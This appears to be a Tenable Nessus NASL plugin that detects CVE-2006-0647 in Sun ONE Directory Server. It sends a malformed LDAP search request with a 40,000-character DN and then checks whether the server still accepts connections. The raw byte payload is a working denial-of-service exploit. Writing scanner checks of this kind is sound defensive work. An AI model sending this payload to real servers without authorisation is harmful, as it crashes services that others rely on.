#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote LDAP server is prone to denial of service attacks. 

Description :

The remote host appears to be running Sun ONE Directory Server, an
LDAP directory from Sun. 

The version of Sun ONE Directory Server fails to handle certain
malformed search requests.  A user can leverage this issue to crash
not just the LDAP server but also the entire application on the remote
host. 

See also :

http://archives.neohapsis.com/archives/dailydave/2006-q1/0129.html

Solution :

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:N/A:P/B:N)";


if (description) {
  script_id(20888);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-0647");
  script_bugtraq_id(16550);

  script_name(english:"Sun ONE Directory Server Denial of Service Vulnerability");
  script_summary(english:"Checks for denial of service vulnerability in Sun ONE Directory Server");
 
  script_description(english:desc);
 
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("ldap_detect.nasl");
  script_require_ports("Services/ldap", 2571);

  exit(0);
}


port = get_kb_item("Services/ldap");
if (!port) port = 2571;
if (!get_port_state(port)) exit(0);


# A bad request.
req = 
  raw_string(
    0x30,                              # universal sequence
    0x82, 0x9c, 0x78,                  # length of the request
    0x02, 0x01, 0x01,                  # message id (1)
    0x63,                              # search request
    0x82, 0x9c, 0x71,                  #   length
    0x04, 0x82, 0x9c, 0x55             #   search term
  ) +
  "dc=" + crap(data:"+", length:40000) + ",dc=example,dc=com" +
  raw_string(
    0x0a, 0x01, 0x02,                  #   scope (subtree)
    0x0a, 0x01, 0x00,                  #   dereference (never)
    0x02, 0x01, 0x00,                  #   size limit (0)
    0x02, 0x01, 0x00,                  #   time limit (0)
    0x01, 0x01, 0x00,                  #   attributes only (false)
    0xa2, 0x05, 0x87, 0x03,            #   filter (!(foo=*))
      "foo", 0x30, 0x00
  );


# Open a socket and send the request.
soc = open_sock_tcp(port);
if (soc) {
  send(socket:soc, data:req);
  res = recv(socket:soc, length:1024);
  close(soc);

  # If we didn't get anything back, check whether it crashed.
  if (res == NULL) {
    # nb: at least under Windows, the server doesn't crash immediately.
    sleep(5);
    soc2 = open_sock_tcp(port);

    # There's a problem if we can't reconnect.
    if (!soc2) {
      security_note(port);
      exit(0);
    }
    else close(soc2);
  }
}

